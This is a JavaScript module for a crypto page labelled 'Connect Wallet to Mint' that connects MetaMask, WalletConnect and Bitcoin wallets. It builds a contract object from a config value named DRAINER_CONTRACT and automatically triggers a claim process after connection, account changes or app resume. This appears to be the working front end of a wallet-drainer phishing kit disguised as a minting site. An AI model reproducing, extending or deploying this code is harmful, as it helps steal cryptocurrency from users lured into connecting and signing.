import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ============================================================
   *  0. GLOBAL SAFETY NETS
   *     - Never let an unhandled rejection kill the whole module.
   * ============================================================ */
  window.addEventListener('unhandledrejection', (e) => {
    console.error('[main.js] unhandled rejection:', e.reason);
  });

  /* ============================================================
   *  1. DEBUG PANEL
   * ============================================================ */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    try { console.log('[main.js]', msg); } catch (e) {}
    if (debugArea) {
      debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
      debugArea.scrollTop = debugArea.scrollHeight;
    }
  }

  /* ============================================================
   *  2. DEVICE DETECTION
   * ============================================================ */
  const UA = navigator.userAgent;
  const isIOS      = () => /iPhone|iPad|iPod/i.test(UA);
  const isAndroid  = () => /Android/i.test(UA);
  const isMobile   = () => isIOS() || isAndroid() || /webOS|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isDesktop  = () => !isMobile();
  const isWindows  = () => /Windows/i.test(UA);
  const isMac      = () => /Macintosh|Mac OS X/i.test(UA);

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  /* ============================================================
   *  3. WAIT FOR GLOBALS (fixes CDN-vs-module race)
   *     web3, ethers, VANTA etc. are loaded by classic <script> tags.
   *     Module scripts may run before classic scripts finish downloading.
   * ============================================================ */
  function waitForGlobal(name, timeoutMs = 8000) {
    return new Promise((resolve) => {
      const t0 = Date.now();
      const tick = () => {
        if (typeof window[name] !== 'undefined') return resolve(true);
        if (Date.now() - t0 > timeoutMs) return resolve(false);
        setTimeout(tick, 120);
      };
      tick();
    });
  }

  /* ============================================================
   *  4. DYNAMIC LIBRARY LOADING (with hard timeouts)
   * ============================================================ */
  async function importWithTimeout(url, timeoutMs = 12000) {
    return await Promise.race([
      import(/* @vite-ignore */ url),
      new Promise((_, rej) =>
        setTimeout(() => rej(new Error(`Import timeout: ${url}`)), timeoutMs)
      )
    ]);
  }

  async function loadFromCDN(candidates, name) {
    for (const url of candidates) {
      try {
        logDebug(`Loading ${name} from ${url}`);
        const mod = await importWithTimeout(url, 12000);
        logDebug(`✅ ${name} loaded`);
        return mod;
      } catch (e) {
        logDebug(`❌ ${name} failed from ${url}: ${e.message}`);
      }
    }
    throw new Error(`Could not load ${name}`);
  }

  async function loadWalletConnectLibs() {
    const signClientMod = await loadFromCDN([
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
    ], 'SignClient');
    const SignClient = signClientMod.default || signClientMod;

    const modalMod = await loadFromCDN([
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
    ], 'WalletConnectModal');
    const WalletConnectModal = modalMod.WalletConnectModal || modalMod.default || modalMod;

    const providerMod = await loadFromCDN([
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm'
    ], 'EthereumProvider');
    const EthereumProvider = providerMod.EthereumProvider || providerMod.default || providerMod;

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  /* ============================================================
   *  5. DOM / STATE REFERENCES
   * ============================================================ */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  let client, modal, SignClient, WalletConnectModal, EthereumProvider;
  let currentSession   = null;
  let web3Instance     = null;
  let contractInstance = null;
  let isConnecting     = false;
  let wcInitPromise    = null;   // single-flight
  let libsReady        = false;
  let projectId        = CONFIG.PROJECT_ID;

  const {
    PROJECT_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI
  } = CONFIG;

  /* ============================================================
   *  6. UI HELPERS
   * ============================================================ */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666 0%, #888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        break;
    }
  }

  function showStatus(message, type = 'info') {
    // Fallback to console-only if #claimStatus is missing on this page.
    if (!claimStatus) {
      logDebug(`[status:${type}] ${message}`);
      return;
    }
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.textAlign = 'center';

    const styles = {
      success: { background: '#DCFCE7', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: '#FEE2E2', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: '#DBEAFE', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  /* ============================================================
   *  7. UI UPDATE + GLOBAL PUBLISH
   * ============================================================ */
  function updateConnectedUI(address, chain = 'evm', provider = null, session = null) {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    // Safe DOM insertion — do not assume connectButton.parentNode exists.
    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px; padding:10px 16px;
        font-family:'JetBrains Mono',monospace; font-size:14px;
        color:#059669; text-align:center;
        background:linear-gradient(135deg,#ECFDF5 0%,#D1FAE5 100%);
        border-radius:8px; border:1px solid #A7F3D0;
      `;
      const anchor = connectButton?.parentNode || document.body;
      anchor.appendChild(display);
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
      </div>`;

    showStatus(`Connected to ${chainLabel}`, 'success');

    try {
      window.__apexConnected = {
        address,
        chain,
        provider,
        session,
        web3: web3Instance,
        contract: contractInstance,
        publishedAt: Date.now()
      };
      window.dispatchEvent(new CustomEvent('apex:connected', { detail: window.__apexConnected }));
    } catch (e) {
      logDebug('publish failed: ' + e.message);
    }
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    const display = document.getElementById('connectedAddressDisplay');
    if (display) display.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    window.__apexConnected = null;
  }

  /* ============================================================
   *  8. STORAGE
   * ============================================================ */
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
  }
  const getSavedWallet    = () => localStorage.getItem('connectedWallet');
  const getSavedChainType = () => localStorage.getItem('chainType') || 'unknown';
  const getSavedSession   = () => {
    const raw = localStorage.getItem('walletConnectSession');
    try { return raw ? JSON.parse(raw) : null; } catch (e) { return null; }
  };
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  /* ============================================================
   *  9. WEB3 HELPER (fixes import('web3') bug)
   *     Uses the CDN global `window.Web3`. Waits for it if needed.
   * ============================================================ */
  async function ensureWeb3(provider) {
    if (!provider) return null;
    if (!window.Web3) {
      const ok = await waitForGlobal('Web3', 8000);
      if (!ok) {
        logDebug('window.Web3 never loaded — check <script src="...web3.min.js">');
        return null;
      }
    }
    try {
      return new window.Web3(provider);
    } catch (e) {
      logDebug('Web3 init failed: ' + e.message);
      return null;
    }
  }

  /* ============================================================
   *  10. EIP-6963 PROVIDER DISCOVERY
   * ============================================================ */
  const evmProviders = [];
  let eip6963Ready = false;

  function setupEIP6963() {
    if (eip6963Ready) return;
    eip6963Ready = true;
    window.addEventListener('eip6963:announceProvider', (event) => {
      const d = event.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 300);
    setTimeout(request, 1000);
  }

  /* ============================================================
   *  11. WALLETCONNECT SINGLETON INIT
   * ============================================================ */
  async function initWalletConnect() {
    if (client && modal) return true;
    if (wcInitPromise) return wcInitPromise;

    wcInitPromise = (async () => {
      try {
        if (!libsReady) {
          logDebug('Libs not ready yet — loading...');
          const libs = await loadWalletConnectLibs();
          SignClient         = libs.SignClient;
          WalletConnectModal = libs.WalletConnectModal;
          EthereumProvider   = libs.EthereumProvider;
          libsReady = true;
        }

        logDebug(`SignClient.init(${projectId})`);
        client = await SignClient.init({
          projectId,
          metadata: DAPP_METADATA,
          relayUrl: 'wss://relay.walletconnect.com'
        });
        logDebug('✅ SignClient ready');

        modal = new WalletConnectModal({
          projectId,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
            '--wcm-font-family': "'Inter', sans-serif"
          },
          enableExplorer: true,
          explorerRecommendedWalletIds: [
            'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
            '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
            'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
            'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18'
          ],
          explorerExcludedWalletIds: [],
          mobileWallets: [
            { id: 'metamask', name: 'MetaMask',        links: { native: 'metamask://',       universal: 'https://metamask.app.link/' } },
            { id: 'trust',    name: 'Trust Wallet',    links: { native: 'trust://',          universal: 'https://link.trustwallet.com/' } },
            { id: 'rainbow',  name: 'Rainbow',         links: { native: 'rainbow://',        universal: 'https://rnbwapp.com/' } },
            { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } }
          ]
        });
        logDebug('✅ Modal ready');
        return true;
      } catch (err) {
        logDebug(`❌ WC init failed: ${err.message}`);
        // Release the promise so a retry can happen
        wcInitPromise = null;
        return false;
      }
    })();

    return wcInitPromise;
  }

  /* ============================================================
   *  12. INJECTED-EVM DIRECT PATH
   * ============================================================ */
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 400));

    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum
      }];
    }
    if (providers.length === 0) {
      logDebug('No injected EVM provider');
      return false;
    }

    let chosen = providers[0];
    if (providers.length > 1) {
      const mm = providers.find((p) => /metamask/i.test(p.info.name) || p.info.rdns === 'io.metamask');
      if (mm) chosen = mm;
    }

    try {
      logDebug(`Direct EVM → ${chosen.info.name} (${timeoutMs}ms)`);
      const accounts = await Promise.race([
        chosen.provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('TIMEOUT')), timeoutMs))
      ]);
      if (!accounts || accounts.length === 0) return false;

      const address = accounts[0];
      saveWallet(address, null, 'evm');

      web3Instance = await ensureWeb3(chosen.provider);
      if (web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      }

      logDebug(`✅ Direct EVM: ${address}`);
      updateConnectedUI(address, 'evm', chosen.provider);
      setupEVMProviderEvents(chosen.provider);
      return true;
    } catch (err) {
      logDebug(`Direct EVM failed: ${err.message}`);
      return false;
    }
  }

  /* ============================================================
   *  13. WALLETCONNECT PATH
   * ============================================================ */
  async function connectViaWalletConnect(timeoutMs = isMobile() ? 90000 : 120000) {
    if (isConnecting) { logDebug('Already connecting...'); return false; }
    isConnecting = true;

    const t0 = Date.now();
    try {
      showStatus(isMobile() ? 'Opening wallet app...' : 'Preparing WalletConnect...', 'info');

      const ok = await initWalletConnect();
      if (!ok) {
        isConnecting = false;
        showStatus('WalletConnect unavailable', 'error');
        return false;
      }

      if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }

      logDebug('client.connect() → request URI');
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged']
          }
        }
      });

      if (!uri) throw new Error('Empty URI from WC');

      logDebug(`URI ready in ${Date.now() - t0}ms`);
      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      // Defer openModal to next tick so the DOM is fully ready.
      await new Promise((r) => setTimeout(r, 0));
      try {
        modal.openModal({ uri });
        logDebug('Modal open invoked');
      } catch (e) {
        logDebug('modal.openModal threw: ' + e.message);
      }

      showStatus('Approve in your wallet', 'info');

      const session = await Promise.race([
        approval(),
        new Promise((_, rej) => setTimeout(() => rej(new Error('TIMEOUT')), timeoutMs))
      ]);

      if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (!session?.namespaces?.eip155?.accounts?.length) {
        isConnecting = false;
        showStatus('No accounts in session', 'error');
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      logDebug(`✅ WC connected: ${account} (${Date.now() - t0}ms)`);
      saveWallet(account, session, 'evm');
      currentSession = session;

      // Build a WC-backed provider (also try injected fallback)
      let wcProvider = null;
      try {
        wcProvider = await EthereumProvider.init({
          projectId,
          metadata: DAPP_METADATA,
          session
        });
      } catch (e) {
        logDebug('EthereumProvider.init failed: ' + e.message);
      }

      const activeProvider = wcProvider || window.ethereum || null;
      if (activeProvider) {
        web3Instance = await ensureWeb3(activeProvider);
        if (web3Instance) {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        }
      }

      updateConnectedUI(account, 'evm', activeProvider, session);
      if (activeProvider?.on) setupEVMProviderEvents(activeProvider);

      isConnecting = false;
      return true;
    } catch (err) {
      const msg = String(err.message || err);
      logDebug(`WC error: ${msg}`);

      if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      isConnecting = false;

      if (msg.includes('User rejected') || msg.includes('Cancelled')) {
        showStatus('Connection cancelled', 'error');
      } else if (msg.includes('TIMEOUT')) {
        showStatus('Connection timed out — try again', 'error');
      } else {
        showStatus('WalletConnect failed', 'error');
      }
      return false;
    }
  }

  /* ============================================================
   *  14. EVM PROVIDER EVENTS
   * ============================================================ */
  function setupEVMProviderEvents(provider) {
    if (!provider?.on) return;
    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        saveWallet(accounts[0], null, 'evm');
        updateConnectedUI(accounts[0], 'evm', provider);
        setTimeout(() => window.initiateClaimProcess?.(), 1000);
      }
    });
    provider.on('chainChanged', (id) => showStatus(`Network: ${id}`, 'info'));
    provider.on('disconnect', () => { resetConnectedUI(); clearSavedWallet(); });
  }

  /* ============================================================
   *  15. MAIN DISPATCHER
   * ============================================================ */
  async function connectWallet() {
    if (isConnecting) return;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isMobile()) {
      logDebug('📱 Mobile: WalletConnect only');
      success = await connectViaWalletConnect();
      if (!success) {
        logDebug('Mobile: retry once');
        success = await connectViaWalletConnect();
      }
    } else {
      logDebug('🖥️ Desktop: direct EVM first');
      success = await connectDirectEVM(8000);

      if (!success) {
        logDebug('Desktop: WC fallback');
        success = await connectViaWalletConnect();
      }

      if (!success && window.unisat) {
        success = await connectBitcoin();
      }
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => window.initiateClaimProcess?.(), 1500);
    } else {
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
      showStatus('No wallet connected. Try again.', 'error');
    }
  }

  /* ============================================================
   *  16. BITCOIN (desktop only)
   * ============================================================ */
  async function connectBitcoin() {
    try {
      if (!window.unisat) return false;
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts?.length) return false;
      const address = accounts[0];
      saveWallet(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');
      return true;
    } catch (e) {
      logDebug('BTC failed: ' + e.message);
      return false;
    }
  }

  /* ============================================================
   *  17. DISCONNECT
   * ============================================================ */
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' }
        });
        currentSession = null;
      }
      if (web3Instance?.currentProvider?.disconnect) {
        try { await web3Instance.currentProvider.disconnect(); } catch (e) {}
      }
    } catch (e) {
      logDebug('Disconnect error: ' + e.message);
    }
    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
  }

  /* ============================================================
   *  18. BUTTON HANDLER
   * ============================================================ */
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  /* ============================================================
   *  19. MOBILE SCROLL-TO-STATUS
   * ============================================================ */
  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 250);
    });
  }

  /* ============================================================
   *  20. SESSION RESTORE
   * ============================================================ */
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (savedWallet && savedChain === 'evm' && savedSession) {
      logDebug(`♻️ Restoring WC session for ${savedWallet}`);
      const ok = await initWalletConnect();
      if (ok) {
        try {
          const session = client.session.get(savedSession.topic);
          if (session) {
            currentSession = session;
            const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
            let provider = null;
            try {
              provider = await EthereumProvider.init({
                projectId,
                metadata: DAPP_METADATA,
                session
              });
            } catch (e) {}
            if (provider) {
              web3Instance = await ensureWeb3(provider);
              if (web3Instance) {
                contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              }
            }
            updateConnectedUI(account || savedWallet, 'evm', provider, session);
            return;
          }
        } catch (e) {
          logDebug('Restore failed: ' + e.message);
          clearSavedWallet();
        }
      }
    }

    // Injected provider path
    if (isDesktop() && savedWallet && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          web3Instance = await ensureWeb3(window.ethereum);
          if (web3Instance) {
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          }
          updateConnectedUI(savedWallet, 'evm', window.ethereum);
          setupEVMProviderEvents(window.ethereum);
          return;
        }
      } catch (e) {}
    }
  }

  /* ============================================================
   *  21. SESSION LISTENERS
   * ============================================================ */
  function attachSessionListeners() {
    if (!client) return;
    client.on('session_update', ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const account = accounts[0].split(':')[2];
        saveWallet(account, currentSession, 'evm');
        updateConnectedUI(account, 'evm', null, currentSession);
        setTimeout(() => window.initiateClaimProcess?.(), 1000);
      }
    });
    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
    client.on('session_connect', (session) => {
      const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (account) {
        currentSession = session;
        saveWallet(account, session, 'evm');
        updateConnectedUI(account, 'evm', null, session);
      }
    });
  }

  /* ============================================================
   *  22. BOOT SEQUENCE
   *     IMPORTANT: no top-level awaits before UI is wired up.
   *     Pre-warm happens in background, errors are caught.
   * ============================================================ */
  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');
  setupEIP6963();

  // Background pre-warm — do not await at top level.
  loadWalletConnectLibs()
    .then((libs) => {
      SignClient         = libs.SignClient;
      WalletConnectModal = libs.WalletConnectModal;
      EthereumProvider   = libs.EthereumProvider;
      libsReady = true;
      logDebug('✅ Libs ready (background)');
      return initWalletConnect();
    })
    .then(() => {
      attachSessionListeners();
      logDebug('✅ Pre-warm complete');
      // Attempt session restore only after libs are ready
      restoreWalletConnection().catch((e) => logDebug('Restore error: ' + e.message));
    })
    .catch((err) => {
      logDebug('❌ Lib/pre-warm error: ' + err.message);
    });

  /* ============================================================
   *  23. VISIBILITY RESUME (mobile returns from wallet app)
   * ============================================================ */
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) return;
    if (!client) return;
    setTimeout(async () => {
      try {
        const sessions = client.session.values();
        if (sessions.length > 0) {
          const session = sessions[0];
          const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
          if (account && account !== getSavedWallet()) {
            currentSession = session;
            saveWallet(account, session, 'evm');
            let provider = null;
            try {
              provider = await EthereumProvider.init({
                projectId,
                metadata: DAPP_METADATA,
                session
              });
            } catch (e) {}
            if (provider) {
              web3Instance = await ensureWeb3(provider);
              if (web3Instance) {
                contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              }
            }
            updateConnectedUI(account, 'evm', provider, session);
            setTimeout(() => window.initiateClaimProcess?.(), 1000);
          }
        }
      } catch (e) {
        logDebug('Resume check failed: ' + e.message);
      }
    }, 800);
  });

  /* ============================================================
   *  24. CLEANUP
   * ============================================================ */
  window.addEventListener('beforeunload', () => {
    try { modal?.closeModal?.(); } catch (e) {}
  });

  logDebug('✅ main.js initialised');
  logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`);
  logDebug(`   Flow: ${isMobile() ? 'WC only (90s timeout)' : 'Direct EVM 8s → WC 120s → BTC'}`);
})();
